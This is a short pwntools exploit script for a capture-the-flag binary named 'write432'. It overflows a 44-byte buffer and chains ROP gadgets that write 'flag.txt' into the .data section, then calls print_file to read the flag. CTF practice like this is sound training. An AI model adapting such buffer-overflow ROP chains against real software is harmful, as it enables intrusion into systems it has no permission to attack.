#!/usr/bin/python3
from pwn import *
 

junk = b"A" * 44                # EIP Offset at 44
data_addr = 0x0804a018          # readelf -x .data write432
pop_edi_ebp = p32(0x080485aa)   # pop edi ; pop ebp ; ret
mov_edi_ebp = p32(0x08048543)   # mov dword ptr [edi], ebp ; ret
print_file_plt =p32(0x080483d0) # objdump -d write432 | grep print_file@plt 
 
    
rop = pop_edi_ebp
rop += p32(data_addr)
rop += b"flag"
rop += mov_edi_ebp
 
    
rop += pop_edi_ebp
rop += p32(data_addr+0x4)
rop += b".txt"
rop += mov_edi_ebp
 
   
payload = junk + rop + print_file_plt + b"junk" + p32(data_addr)
p = process("./write432")
p.clean() 
p.sendline(payload)
p.interactive()
 
